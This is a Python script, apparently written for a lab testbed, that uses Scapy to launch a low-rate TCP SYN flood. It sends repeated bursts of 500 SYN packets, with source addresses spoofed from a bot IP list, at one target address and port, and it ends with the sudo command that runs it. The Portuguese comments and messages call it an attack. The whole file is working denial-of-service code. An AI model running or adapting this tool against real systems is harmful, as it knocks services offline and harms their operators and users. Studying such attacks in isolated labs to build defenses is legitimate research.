from scapy.all import *
import random
import time
import ipaddress

TARGET_IP = "192.168.100.2"
TARGET_PORT = 50001
BOTFILE = "bots.txt"
PACKETS_PER_BURST = 500      # Quantos pacotes em cada burst
BURST_DURATION = 1           # Duração de cada burst em segundos
SILENCE_DURATION = 1         # Duração da pausa entre bursts

def load_bots(filename):
    bot_ips = []
    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)
    return bot_ips

def run_tcp_lowrate_attack():
    bot_ips = load_bots(BOTFILE)
    burst_count = 0
    total_packets = 0
    iface = "enp0s3"

    print("Iniciando ataque TCP SYN Low Rate em bursts... Pressione Ctrl+C para interromper.")

    try:
        while True:
            burst_count += 1
            lista_de_pacotes = []

            # Prepara os pacotes do burst
            for _ in range(PACKETS_PER_BURST):
                source_ip = random.choice(bot_ips)
                ip_layer = IP(src=source_ip, dst=TARGET_IP)
                eth_layer = Ether()
                seq_num = random.randint(0, 4294967295)
                tcp_layer = TCP(sport=RandShort(), dport=TARGET_PORT, flags='S', seq=seq_num, window=8192)
                packet = eth_layer / ip_layer / tcp_layer
                lista_de_pacotes.append(packet)

            print(f"Enviando burst {burst_count} com {PACKETS_PER_BURST} pacotes...")
            start_time = time.perf_counter()
            sendpfast(lista_de_pacotes, iface=iface, file_cache=True)
            end_time = time.perf_counter()
            duration = end_time - start_time

            total_packets += PACKETS_PER_BURST
            print(f"Burst {burst_count} concluído. Duração do burst: {duration:.4f} segundos. Total enviado: {total_packets} pacotes.")
            
            # Espera entre os bursts
            print(f"Aguardando {SILENCE_DURATION} segundo(s) antes do próximo burst...")
            time.sleep(SILENCE_DURATION)
    except KeyboardInterrupt:
        print("\nAtaque interrompido pelo usuário.")

if __name__ == "__main__":
    print("e")
    run_tcp_lowrate_attack()

# sudo PYTHONPATH=$HOME/scapy python3 tcp_low_rate.py